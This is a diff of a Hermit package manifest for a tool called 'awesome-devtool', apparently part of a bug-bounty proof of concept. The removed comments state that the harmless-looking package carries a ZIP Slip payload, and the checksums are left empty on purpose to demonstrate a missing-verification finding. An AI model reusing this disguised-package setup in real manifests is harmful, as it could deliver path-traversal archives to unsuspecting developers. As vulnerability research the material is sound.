@@ -1,28 +1,17 @@
-// Hermit Package Manifest — awesome-devtool
-// Yeh ek "helpful developer tool" lagta hai
-// Lekin iska ZIP Slip payload carry karta hai (PoC)
+description = "Awesome Dev Tool - Fast CLI utility for Go developers (Bug Bounty PoC)"
+homepage = "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing"
+binaries = ["awesome-devtool"]
 
-description = "Awesome Dev Tool v1.0 - Fast CLI utility for Go developers"
-test = "awesome-devtool --version"
-binaries = ["bin/awesome-devtool"]
+// Source URL with platform variables that hermit substitutes automatically
+source = "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v${version}/awesome-devtool-${version}-${os}-${arch}.tar.gz"
 
-// Update check every day
-channel "stable" {
-  update = "24h"
+// Version block — required by hermit
+version "1.0.0" {
 }
 
-// Linux AMD64 — malicious ZIP
-platform "linux" "amd64" {
-  source = "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-linux-amd64.tar.gz"
-  // sha256 intentionally empty (demonstrates missing checksum issue too)
-}
-
-// macOS AMD64
-platform "darwin" "amd64" {
-  source = "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-darwin-amd64.tar.gz"
-}
-
-// macOS ARM64 (M1/M2)
-platform "darwin" "arm64" {
-  source = "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-darwin-arm64.tar.gz"
+// SHA256 checksums (empty for PoC — also demonstrates FINDING-09: missing checksum)
+sha256sums = {
+  "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-1.0.0-linux-amd64.tar.gz": "",
+  "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-1.0.0-darwin-amd64.tar.gz": "",
+  "https://github.com/sachinpatilhsp-max/Hermit-Bug-Testing/releases/download/v1.0.0/awesome-devtool-1.0.0-darwin-arm64.tar.gz": "",
 }
